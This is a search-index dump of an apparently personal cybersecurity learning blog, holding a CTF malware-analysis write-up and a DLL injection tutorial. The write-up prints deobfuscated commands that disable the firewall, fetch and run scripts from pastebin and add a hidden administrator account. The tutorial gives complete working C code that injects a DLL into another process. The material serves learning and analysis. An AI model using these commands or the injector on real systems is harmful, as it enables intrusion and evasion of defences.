but I am trying to apply the Feynman's technique which helps me a lot to memorize and better understand the stuff I am learning (thus, this blog).\nNote 3\rI also really like making CTF challenges, some of which you are going to see here in this blog:)\nNote 4\rThis is basically a journal into my journey into cybersecurity, keeping track of what I have learned and stuff that may seem useful to any of you that are reading it. Obviously, my posts and things I read from other authors and just try to try them myself, so credits go to them:)\nNote 5\rThat's a wrap I think. Hope you stick around, have fun:)\n","permalink":"http://localhost:1313/about/","summary":"about","title":"About"},{"content":"Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions. Try to craft the path for the png image. Try and execute a script named herfxmasgiftfreh.cmd found inside an ADS stream of the png file. This should raise some alarms about the script inside the ADS stream of the png image, so let’s start analyzing it. To get the contents of the hidden script inside the ADS stream, we can run the following command: After running the command “Get-Content –Path .\\VillageOfSanta.png -Stream herfxmasgiftfreh.cmd” we get the embedded .cmd script that seems to be obfuscated. Let’s save it to a separate file and start deobfuscating it.\nDeobfuscation The method of obfuscation here is called envar obfuscation. Basically the malware creates a set of characters and creates the code to be executed by taking individual characters from the defined list:\nAfter we are done deobfuscating the script (by replacing each expression with the corresponding character), we are met with the following script:\nThe script has a lot going on, but we should pay attention to only 3 suspicious parts. The first one is the one where the script tries to download a .bat file from Pastebin and then run it:\nnetsh firewall set opmode mode-disable powershell -command \u0026#34;Invoke-Webrequest https://pastebin.com/raw/bLnD8FWX -outfile KillAVS.bat\u0026#34; start KillAVS.bat If we visit this url, we are met with another obfuscated script:\nUpon deobfuscating it with the same method used previously, we end up with the following deobfuscated script:\nThis tried to stop all possible AV engines that may be installed on the system. Really interesting, but no flag here, so let’s move to the second suspicious url:\ncls powershell -Command \u0026#34;Invoke-WebRequest https://pastebin.com/raw/ptkj3Ua5 -outFile ycynlog.cmd\u0026#34; start /min ycynlog.cmd As before, another obfuscated script can be found by visiting the url:\nDeobfuscating once again the script with the same methodology, we end up with:\nAnother file being dropped… But this time its an executable. Maybe this is the end? Visiting the rentry link we end up with some hex values that match the header of an executable:\nThe script itself tries to decode them and save the bytes to an executable, so we should try and do the same. We can use cyberchef for that:\nSaving them as an .exe and opening the executable in IDA, we are met with the following contents:\nAfter looking around a bit in the functions, we are finally met with the flag:\nUINT AddUser() { WinExec( \u0026#34;cmd.exe /c net user System_guest NHACK{4_7h3_23c02d_7h15_w45_4n_4c7u4l_m4lw4r3_54mpl3_s0_c0n92475!!} /add\u0026#34;; 0); return WinExec(\u0026#34;cmd.exe /c net localgroup administrators System_guest /add\u0026#34;; 0); } ","permalink":"http://localhost:1313/ctfwriteups/anemailfromauntchloe/","summary":"\u003ch2 id=\"starting-the-analysis\"\u003eStarting the analysis\u003c/h2\u003e\n\u003cp\u003eIn this challenge we are provided with a .rar file. We can extract the following files from this archive:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAn image named “SantasVillage.png”\u003c/li\u003e\n\u003cli\u003eA txt named “RecipeForClassicBreadStuffing.txt”\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIf we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code:\n\u003cimg loading=\"lazy\" src=\"/posts/writeups/ntua/emailAuntChloe1.png\" alt=\"contents vbs\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWhat this script is doing is:\u003c/p\u003e","title":"An email from aunt Chloe - Writeup"},{"content":" Intro When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.\nBefore I could proceed in experimenting with this topic though, I had to first learn how to do DLL Injection since DLL Unlinking is related to that.\nSo basically this post will be just that: Learning DLL Injection!\nWhat is DLL Injection DLL Injection is a technique that exists for a while now and is used by malware, where a malicious process injects a DLL existing on the disk into a target (and legitimate) process.\nBasically, processes use DLL\u0026rsquo;s for their functionality, so the idea is to inject an \u0026ldquo;extra\u0026rdquo; DLL (which is malicious and definitely not needed by the process) into that legitimate process to try and go under the radar.\nThere are many DLL injection techniques such as:\nReflective DLL Injection DLL Search Order Hijack I was just starting to learn about the simply DLL Injection technique so the examples shown will be about that.\nOverview of how it works The idea is we have a target process that we would like to inject a dll into:\nThen we have an injector process that we initiate the injection procedure (basically the process that will inject the DLL into another process):\nThe first thing to do is to allocate memory to the target process address space and write the path of the dll into the target address space process.\nThe reason for that is that we are going to use the CreateRemoteThread function to run the LoadLibrary api and LoadLibrary needs the path to the dll, so we have to put the path in the target process were the remote thread will run.\nThen we can create the remote thread in the target process, our thread will be pointed to the LoadLibrary function. It\u0026rsquo;s going to call the LoadLibrary function using the dll path we wrote before and that would force the dll to be loaded into a target process:\nThen the injector process can simply go away as we dont need it anymore, and the dll will simply be there:\nLocal vs Remote DLL Injection I will first go through a simple local DLL injection to get a bit comfortable around the concept of the loaded path of the DLL that will be loaded into memory. When I say local DLL injection, I mean:\n[Step 1]: Creating a DLL. [Step 2]: Creating an executable. [Step 3]: Running the executable and loading the DLL into that running executable we created on Step 2. After we are comfortable around that, we will see how to inject the DLL not to a local process but to a remote one (remote DLL Injection). When I say remote DLL Injection, I mean:\n[Step 1]: Creating a DLL. [Step 2]: Creating an executable. [Step 3]: Running the executable and loading the DLL into some other process, like notepad.exe for example. Making a simple DLL The DLL we will be injecting is the following:\n#include \u0026#34;pch.h\u0026#34; #include \u0026#34;Windows.h\u0026#34; #include \u0026#34;stdio.h\u0026#34; VOID MsgBoxPayload() { MessageBoxA(NULL, \u0026#34;DLL Injected successfully:D\u0026#34;, \u0026#34;Wow !\u0026#34;, MB_OK | MB_ICONINFORMATION); } BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: { MsgBoxPayload(); break; }; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } This will simply call the MsgBoxPayload() function once the DLL is attached to a process (DLL_PROCESS_ATTACH).\nLocal DLL Injection To do a local DLL Injection, you simply just load the DLL into the running process created by your executable. To load the DLL, you just need to use LoadLibrary:\n#include \u0026lt;Windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char* argv[]) { // Check that an argument was passed if (argc \u0026lt; 2) { printf(\u0026#34;[!] Missing Argument; Dll Payload To Run \\n\u0026#34;); return -1; } printf(\u0026#34;[i] Injecting \\\u0026#34;%s\\\u0026#34; To The Local Process Of Pid: %d \\n\u0026#34;, argv[1], GetCurrentProcessId()); // Get full path of the provided DLL char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(argv[1], MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u0026gt; MAX_PATH) { printf(\u0026#34;[!] Could not determine the full path for %s. Error: %d \\n\u0026#34;, argv[1], GetLastError()); return; } // Load the DLL with LoadLibraryA printf(\u0026#34;[+] Loading Dll... \u0026#34;); if (LoadLibraryA(fullPath) == NULL) { printf(\u0026#34;[!] LoadLibraryA Failed With Error : %d \\n\u0026#34;, GetLastError()); return -1; } printf(\u0026#34;[+] DONE ! \\n\u0026#34;); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Quit ... \u0026#34;); getchar(); return 0; } Now that we have our executable and the DLL ready for injection, let\u0026rsquo;s open Process Hacker and then proceed to run our injector:\nAnd we see that indeed our DLL - that is definitely not needed for the process created by our executable - is loaded in the Modules this process uses.\nOkay cool, but it would be really nice if we could use our executable to load the DLL not to the process created by our exe, but to a totally different process. Here comes the remote DLL Injection, so let\u0026rsquo;s see how to do that!\nRemote DLL Injections In the remote DLL Injection, we inject a DLL into a remote process. In order to do that though, we need the PID of the target process.\nAlso, the target process we want to inject our DLL into might not be even running, so the first step in injecting DLL\u0026rsquo;s in remote processes is to first enumerate the running processes on the system.\nAs always, I will start by writting the code and explain each part as we develop it further.\nRemote DLL Injection PoC In the remote DLL Injection there is a lot more going on, but nothing too extreme. The code starts like the local DLL Injection where we need to get arguments from the user, specifically the dll we want to inject and the name of the process we want to inject our DLL into:\nint main(int argc, char* argv[]) { if (argc \u0026lt; 3) { printf(\u0026#34;[!] Usage: dll_injection.exe \u0026lt;dll_path\u0026gt; \u0026lt;target_process\u0026gt; \\n\u0026#34;); return -1; } char* dllPath = argv[1]; char* targetProcessName = argv[2]; printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; to exit...\\n\u0026#34;); getchar(); return 0; } After we provide our DLL name and the target process name, we make some additional checks and convertions. Specifically:\nWe find the full path of the DLL. We convert the target process name and the full DLL path to wide char. The reason we convert to wide char is because the GetFullPathNameA will return an ANSI string. Later we will pass that string to a method called InjectDllRemoteProcess which will work with LPWSTR, so a proper convertion to wchar_t array is needed in order to avoid missing null terminations or wrong encoding. So the code is updated with the following part:\n... // Convert target process name to wide characters. WCHAR targetProcess[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH); printf(\u0026#34;[i] DLL to inject: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, dllPath); printf(\u0026#34;[i] Target process: \\\u0026#34;%S\\\u0026#34;\\n\u0026#34;, targetProcess); // Get the absolute path of the DLL. char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u0026gt; MAX_PATH) { printf(\u0026#34;[!] Could not determine full path for %s. Error: %d\\n\u0026#34;, dllPath, GetLastError()); return -1; } printf(\u0026#34;[i] Full DLL path resolved to: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, fullPath); // Convert DLL path to wide characters. WCHAR wideFullPath[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH); ... After we are done with our convertions, it is time to get a handle for the target process. Handle is a way to communicate with a resource. For example, when you open a file in python, you basically get a handle to that file. Without getting a handle we won\u0026rsquo;t be able to make any other progress:\n... DWORD processId; HANDLE hProcess; if (!GetRemoteProcessHandle(targetProcess, \u0026amp;processId, \u0026amp;hProcess)) { printf(\u0026#34;[!] Failed to find or access target process \\\u0026#34;%S\\\u0026#34;.\\n\u0026#34;, targetProcess); return -1; } printf(\u0026#34;[i] Process \\\u0026#34;%S\\\u0026#34; found with PID: %d\\n\u0026#34;, targetProcess, processId); ... But how do we actually get a handle to the target process? Do we know if the process is even running on the victim\u0026rsquo;s machine? And how do we find among all the running processes the one we are interested in?\nAnswers to all these questions exist inside the GetRemoteProcessHandle function, so let\u0026rsquo;s continue from there.\nGetRemoteProcessHandle - Getting a handle to the target process The goal of our BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) is to find out if our target process exist, and if that is the case to return us a handle to that process along with its PID. So we must pass as parameters:\nthe target process name (the full path we converted earlier). the pointer to the processId which will be returned to us - if found. the pointer of the handle we will get of the process - if found. The way this method works is by taking a snapshop of all the currently running processes of the machine with a function called CreateToolhelp32Snapshot and then just enumerating each one of them, comparing our target process name to the current one in the enumeration until it finds a match (or until the loop ends).\nThe part of the code that takes the snapshot is:\nHANDLE hSnapShot = NULL; // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\u0026#34;[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\u0026#34;, GetLastError()); goto _EndOfFunction; } In case you are wondering how to find the correct parameter to pass in CreateToolhelp32Snapshot like TH32CS_SNAPPROCESS, you always must revise microsoft documentation:\nMicrosoft docs are so kind they let us know that in order to enumerate processes, we should see Process32First. So let\u0026rsquo;s continue with the utilization of this function and explain how we use it:\n... // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\u0026#34;[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\u0026#34;, GetLastError()); goto _EndOfFunction; } PROCESSENTRY32\tProc = { .dwSize = sizeof(PROCESSENTRY32) }; // Get details of the first process from the snapshot. if (!Process32First(hSnapShot, \u0026amp;Proc)) { printf(\u0026#34;[!] Process32First Failed With Error : %d \\n\u0026#34;, GetLastError()); goto _EndOfFunction; } _EndOfFunction: if (hSnapShot != NULL) CloseHandle(hSnapShot); if (*dwProcessId == NULL || *hProcess == NULL) return FALSE; return TRUE; ... As I mentioned previously, we would get a snapshot of the current running processes of the machine and then enumerate them. As the microsoft docs advised us, we should use Process32First for the enumeration. But what are the parameters passed to this function and why did we change the dwSize of the struct PROCESSENTRY32 of the Proc struct?\nThe parameters passed are:\nhSnapShot: This was the returned value from CreateToolhelp32Snapshot which is basically the handle to all the current running processes. \u0026amp;Proc: This is a pointer to a PROCESSENTRY32 struct. Why? Well, because processes in Windows are of that type, so basically we tell Process32First to look into the current running processes that are of type PROCESSENTRY32 so it knows how to handle and enumerate them. We can also advise microsoft docs on how to use a function, and in this case we should in order to understand why we modify the dwSize value of that struct:\nNow that these are clear, let\u0026rsquo;s start the enumeration:\ndo { WCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD dwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero\u0026#39;s RtlSecureZeroMemory(LowerName, sizeof(LowerName)); // Convert Proc.szExeFile to lowercase and store in LowerName. if (dwSize \u0026lt; MAX_PATH * 2) { for (; i \u0026lt; dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = \u0026#39;\\0\u0026#39;; } } // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\u0026#34;[!] OpenProcess Failed With Error : %d \\n\u0026#34;, GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026amp;Proc)); The enumeration does the following three steps:\n[Step 1]: It declares - and overrites in everyloop - a variable to store the current process name. [Step 2]: Converts name of the current process to lowercase. [Step 3]: Compares the lowercase name with the targetProcess name. [Step 3.1]: If a match is found, a handle is returned for that process. Let\u0026rsquo;s see each one of the steps more in depth.\nProcess enumeration - [Step 1] In Step 1, we declare a variable to store the name of the current process in each iteration, and then we overrite it with zero\u0026rsquo;s to clear its memory:\nWCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD\tdwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero\u0026#39;s RtlSecureZeroMemory(LowerName, sizeof(LowerName)); Basically, if Proc.szExeFile exists, we get its size based on the name, which we get from the PROCESSENTRY32 struct member szExeFile. We can see that from microsoft docs as well:\nThen, we ideally want to clean the memory that the previous loaded process name was stored, so we use RtlSecureZeroMemory for this:\nProcess enumeration - [Step 2] In Step 2, we basically get each character of the szExeFile member and convert it to lowercase, also casting it to WCHAR type. This is because the target process name is passed as lowercase and is also of type WCHAR, so we want the currently enumerated process to be in the same format in order to compare it with the target one:\nif (dwSize \u0026lt; MAX_PATH * 2) { for (; i \u0026lt; dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = \u0026#39;\\0\u0026#39;; } Process enumeration - [Step 3] In Step 3, we compare the current process name with the target one. If a match is found, we store its process ID, and then we try to get a handle to that process with OpenProcess:\n... // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\u0026#34;[!] OpenProcess Failed With Error : %d \\n\u0026#34;, GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026amp;Proc)); We can always look the microsoft docs to understand why we pass these values in the OpenProcess, but here is the syntax of it:\nHANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId ); Note\nA more stealthy approach for the dwDesiredAccess value would be PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD instead of PROCESS_ALL_ACCESS.\nThis is why PROCESS_ALL_ACCESS is really noisy as it asks for all possible access permisions, while the other approach asks for only what is needed.\nThis could result in flagging the script as malware more easily, but since this is just a PoC, we can ignore it for now.\nIf a handle is returned back successfully, the loop ends. If not, the corresponding error is printed on the screen and if no match was found in the first place, the enumeration continues with Process32Next.\nInjectDllRemoteProcess - Injecting the DLL to the remote process After the GetRemoteProcessHandle function is finished and we have gotten back a handle to the target process, it is time to inject our DLL into that process. All we need is a handle to that process and the path to our DLL to inject:\n// Inject the DLL into the target process. if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) { printf(\u0026#34;[!] DLL injection failed.\\n\u0026#34;); CloseHandle(hProcess); return -1; } Let\u0026rsquo;s dive into this function responsible for the injection:\nBOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) { BOOL bSTATE = TRUE; LPVOID pLoadLibraryW = NULL; LPVOID pAddress = NULL; // Calculate size of the DLL path in bytes (including null terminator). DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR); SIZE_T lpNumberOfBytesWritten = NULL; HANDLE hThread = NULL; // Fetch LoadLibraryW address from kernel32.dll. pLoadLibraryW = GetProcAddress(GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryW\u0026#34;); if (pLoadLibraryW == NULL) { printf(\u0026#34;[!] GetProcAddress Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } // Allocate memory in the target process. pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pAddress == NULL) { printf(\u0026#34;[!] VirtualAllocEx Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[i] pAddress Allocated At : 0x%p Of Size : %d\\n\u0026#34;, pAddress, dwSizeToWrite); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Write ... \u0026#34;); getchar(); // Write the DLL name to the allocated memory in the target process. if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) { printf(\u0026#34;[!] WriteProcessMemory Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[i] Successfully Written %d Bytes\\n\u0026#34;, lpNumberOfBytesWritten); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Run ... \u0026#34;); getchar(); // Create a remote thread to execute LoadLibraryW in the target process. hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); if (hThread == NULL) { printf(\u0026#34;[!] CreateRemoteThread Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[+] DONE !\\n\u0026#34;); // Close thread handle after execution. CloseHandle(hThread); return TRUE; } This function basically takes as arguments only what is needed for the DLL Injection:\nhProcess: the process handle we want to inject the dll into. DllName: The dll we want to inject into the process. The most important parts that we must highlight are the following:\npLoadLibraryW = GetProcAddress(GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryW\u0026#34;); This part of the code retrieves the address of the LoadLibraryW function from kernel32.dll using the GetModuleHandle and GetProcAddress functions.\nNote\nThis is possible because kernel32.dll is loaded into every process, and its base address is consistent across all processes on a given system during a single boot session (due to how Windows implements ASLR for certain system libraries).\nEven though ASLR randomizes the base address of kernel32.dll after every system reboot, during any single boot, all processes will have the same base address for this module. This allows us to calculate the address of the LoadLibraryW within kernel32.dll in our process and based on the address we find, use the same one for the remote target process we want to inject the dll into. This technique leverages the shared base address of kernel32.dll across processes, allowing us to locate Windows API libraries in different processes.\nThe next part of the code that is of importance is:\npAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); This line allocates memory using the VirtualAllocEx API, to allocate memory in a different process tham our own process.\nThe structure of VirtualAllocEx is the following:\nLPVOID VirtualAllocEx( [in] HANDLE hProcess,\t// handle to the process we want to allocate memory. [in, optional] LPVOID lpAddress,\t// desired starting address - we don\u0026#39;t really care. [in] SIZE_T dwSize,\t// size of the path of the DLL to be injected. [in] DWORD flAllocationType,\t// memory allocation type. [in] DWORD flProtect\t// page protection - the page that was previously specified in flAllocationType. ); flAllocationType: For the allocation type we used MEM_COMMIT | MEM_RESERVE in order to reverse a chunk of the target process and commit it immediately.\nflProtect: For the protection of the page that was reserved and commited, we use PAGE_READWRITE for read and write, otherwise WriteProcessMemory (we will see this shortly) won\u0026rsquo;t be able to write, and LoadLibraryW wouldn\u0026rsquo;t be able to read.\nAfter the memory has been successfully allocated in the remote target process, we now need to write to the allocated buffer (the reserved and commited page). We will use the WriteProcessMemory for that purpose in order to write the DLL\u0026rsquo;s path/name in the allocated memory.\nThe structure of the WriteProcessMemory is the following:\nBOOL WriteProcessMemory( [in] HANDLE hProcess, // A handle to the process whose memory to be written to [in] LPVOID lpBaseAddress, // Base address in the specified process to which data is written [in] LPCVOID lpBuffer, // A pointer to the buffer that contains data to be written to \u0026#39;lpBaseAddress\u0026#39; [in] SIZE_T nSize, // The number of bytes to be written to the specified process.\t[out] SIZE_T *lpNumberOfBytesWritten // A pointer to a \u0026#39;SIZE_T\u0026#39; variable that receives the number of bytes actually written ); We therefore use this API in order to write the Dll path/name to the pAddress of the hProcess (the address returned from the previous memory allocation inside the remote target process):\nif (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) If everything is correct, then by now we should have:\nallocated memory into the remote target process. written the dll path/name inside that allocated memory. Only thing that is left to do is create a remote thread into that process which will basically just load the path/name of the dll written into that address, resulting in its execution!\nBased on that, the last line of interest is:\nhThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); The CreateRemoteThread API creates a remote thread inside the hProcess (the remote target process), and specifies to that thread that it should use the LoadLibraryW API to load whatever is inside pAddress (which is the path of the DLL written previously).\nSeeing that in action:\nUntil now, memory has been allocated into the remote target process. If we press Enter, the path of the dll will be written in that allocated memory. Let\u0026rsquo;s open x64dbg to observe that:\nWe observe that indeed the dll path has been loaded, but what about running it? Let\u0026rsquo;s press one more Enter of the LoadLibraryW to take place and load that written dll path, resulting in its execution:\nWe once again see within Process Hacker that indeed our malicious dll has been loaded:\nOverall, the whole code is:\n#include \u0026lt;Windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;tlhelp32.h\u0026gt; BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) { // Ensure the dwSize member is set correctly before using Process32First. PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) }; HANDLE hSnapShot = NULL; // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\u0026#34;[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\u0026#34;, GetLastError()); goto _EndOfFunction; } // Get details of the first process from the snapshot. if (!Process32First(hSnapShot, \u0026amp;Proc)) { printf(\u0026#34;[!] Process32First Failed With Error : %d \\n\u0026#34;, GetLastError()); goto _EndOfFunction; } do { WCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD dwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero\u0026#39;s RtlSecureZeroMemory(LowerName, sizeof(LowerName)); // Convert Proc.szExeFile to lowercase and store in LowerName. if (dwSize \u0026lt; MAX_PATH * 2) { for (; i \u0026lt; dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = \u0026#39;\\0\u0026#39;; } } // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\u0026#34;[!] OpenProcess Failed With Error : %d \\n\u0026#34;, GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026amp;Proc)); // Clean up resources. _EndOfFunction: if (hSnapShot != NULL) CloseHandle(hSnapShot); if (*dwProcessId == NULL || *hProcess == NULL) return FALSE; return TRUE; } BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) { BOOL bSTATE = TRUE; LPVOID pLoadLibraryW = NULL; LPVOID pAddress = NULL; // Calculate size of the DLL path in bytes (including null terminator). DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR); SIZE_T lpNumberOfBytesWritten = NULL; HANDLE hThread = NULL; // Fetch LoadLibraryW address from kernel32.dll. pLoadLibraryW = GetProcAddress(GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryW\u0026#34;); if (pLoadLibraryW == NULL) { printf(\u0026#34;[!] GetProcAddress Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } // Allocate memory in the target process. pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pAddress == NULL) { printf(\u0026#34;[!] VirtualAllocEx Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[i] pAddress Allocated At : 0x%p Of Size : %d\\n\u0026#34;, pAddress, dwSizeToWrite); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Write ... \u0026#34;); getchar(); // Write the DLL name to the allocated memory in the target process. if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) { printf(\u0026#34;[!] WriteProcessMemory Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[i] Successfully Written %d Bytes\\n\u0026#34;, lpNumberOfBytesWritten); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Run ... \u0026#34;); getchar(); // Create a remote thread to execute LoadLibraryW in the target process. hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); if (hThread == NULL) { printf(\u0026#34;[!] CreateRemoteThread Failed With Error : %d \\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;[+] DONE !\\n\u0026#34;); // Close thread handle after execution. CloseHandle(hThread); return TRUE; } int main(int argc, char* argv[]) { if (argc \u0026lt; 3) { printf(\u0026#34;[!] Usage: dll_injection.exe \u0026lt;dll_path\u0026gt; \u0026lt;target_process\u0026gt; \\n\u0026#34;); return -1; } char* dllPath = argv[1]; char* targetProcessName = argv[2]; // Convert target process name to wide characters. WCHAR targetProcess[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH); printf(\u0026#34;[i] DLL to inject: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, dllPath); printf(\u0026#34;[i] Target process: \\\u0026#34;%S\\\u0026#34;\\n\u0026#34;, targetProcess); // Get the absolute path of the DLL. char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u0026gt; MAX_PATH) { printf(\u0026#34;[!] Could not determine full path for %s. Error: %d\\n\u0026#34;, dllPath, GetLastError()); return -1; } printf(\u0026#34;[i] Full DLL path resolved to: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, fullPath); // Convert DLL path to wide characters. WCHAR wideFullPath[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH); DWORD processId; HANDLE hProcess; if (!GetRemoteProcessHandle(targetProcess, \u0026amp;processId, \u0026amp;hProcess)) { printf(\u0026#34;[!] Failed to find or access target process \\\u0026#34;%S\\\u0026#34;.\\n\u0026#34;, targetProcess); return -1; } printf(\u0026#34;[i] Process \\\u0026#34;%S\\\u0026#34; found with PID: %d\\n\u0026#34;, targetProcess, processId); // Inject the DLL into the target process. if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) { printf(\u0026#34;[!] DLL injection failed.\\n\u0026#34;); CloseHandle(hProcess); return -1; } printf(\u0026#34;[+] DLL successfully injected into process \\\u0026#34;%S\\\u0026#34;.\\n\u0026#34;, targetProcess); CloseHandle(hProcess); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; to exit...\\n\u0026#34;); getchar(); return 0; } References\n[1] Pavel Yosifovich: DLL Injection with CreateRemoteThread\r[2] Red Team Notes: DLL Injection\r[3] crow: Malware Development: Process Injection\r[4] MalDev Academy\r","permalink":"http://localhost:1313/posts/dllinjection/","summary":"\u003cstyle\u003e\r\n\tfieldset {\r\n\t\tbackground: url('/img/test.gif') no-repeat center center;\r\n\t\tbackground-size: cover;\r\n\t\tborder: 1px solid #ccc;\r\n\t\tpadding: 10px;\r\n\t\tposition: relative;\r\n\t\tz-index: 2;\r\n\t\tcolor: #dcdcdc;\r\n\t\tfont-weight: 500;\r\n\t}\r\n\u003c/style\u003e \r\n\u003ch2 